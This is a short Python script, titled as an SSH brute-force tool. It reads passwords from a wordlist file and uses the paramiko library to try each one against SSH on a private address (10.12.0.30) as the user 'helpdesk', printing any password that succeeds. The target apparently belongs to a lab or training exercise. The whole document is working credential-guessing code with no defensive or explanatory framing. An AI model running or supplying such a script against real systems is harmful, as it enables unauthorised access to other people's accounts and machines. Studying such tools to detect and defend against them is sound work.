#final SSH brute force
import paramiko, socket, time
a_file = open("passwords.txt", "r")
a_filelines = a_file.readlines()
plist1 = []
plist = []
for line in a_filelines:
    plist1.append(line)
for x in plist1:
    plist.append(x.strip())
   
def sshbrute(plist):
    hostname = '10.12.0.30'
    username = 'helpdesk'
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    connection = None
    for each in plist:
        password = each
        try:
                ssh.connect(hostname = hostname, password= password, username= username)
                connection = True
                ssh.close()
                if connection:
                    print('Success',password,'worked')
        except paramiko.AuthenticationException as e:
            print(e)
            time.sleep(1)

        ssh.close()
sshbrute(plist)